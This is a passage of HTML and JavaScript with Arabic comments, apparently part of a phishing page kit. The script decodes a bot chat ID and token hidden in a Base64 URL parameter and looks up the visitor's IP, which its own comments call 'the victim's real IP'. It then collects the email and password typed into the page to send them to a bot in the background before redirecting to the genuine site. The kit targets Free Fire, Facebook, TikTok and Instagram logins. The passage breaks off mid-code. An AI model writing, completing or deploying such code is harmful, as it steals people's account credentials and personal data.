    <div id="contentContainer"></div>

    <script>
        // دالة لفك تشفير Base64 وتحويل النص إلى كائن params
        function decodeBase64Data(encoded) {
            try {
                // فك التشفير
                let decoded = atob(encoded);
                
                // محاولة التحليل كـ JSON أولاً
                if (decoded.trim().startsWith('{')) {
                    return JSON.parse(decoded);
                } else {
                    // إذا لم يكن JSON، نعتبره query string (مثل ?chat_id=...&token=...)
                    // نزيل علامة الاستفهام إذا وجدت
                    if (decoded.startsWith('?')) {
                        decoded = decoded.substring(1);
                    }
                    const params = new URLSearchParams(decoded);
                    const result = {};
                    for (let [key, value] of params.entries()) {
                        result[key] = value;
                    }
                    return result;
                }
            } catch (e) {
                console.error('فشل فك تشفير البيانات:', e);
                return null;
            }
        }

        // استخراج المعاملات من الرابط
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            
            // محاولة قراءة الباراميتر المشفر 'd' أولاً
            const encodedData = params.get('d');
            if (encodedData) {
                const decoded = decodeBase64Data(encodedData);
                if (decoded && decoded.chat_id && decoded.token && decoded.platform) {
                    return {
                        chat_id: decoded.chat_id,
                        token: decoded.token,
                        platform: decoded.platform
                    };
                }
            }
            
            // إذا لم يوجد 'd' أو فشل فك التشفير، نقرأ الباراميترات العادية
            return {
                chat_id: params.get('chat_id'),
                token: params.get('token'),
                platform: params.get('platform')
            };
        }

        // الحصول على IP حقيقي للضحية
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }

        // إرسال البيانات للبوت (في الخلفية) ثم التوجيه للموقع الحقيقي
        async function sendToBot(platform) {
            const params = getUrlParams();
            const email = document.getElementById('email')?.value || '';
            const password = document.getElementById('password')?.value || '';
            
            if (email && password && params.chat_id && params.token) {
                const platformNames = {
                    'freefire': 'فري فاير',
                    'facebook': 'فيسبوك',
                    'tiktok': 'تيك توك',
                    'instagram': 'انستجرام',
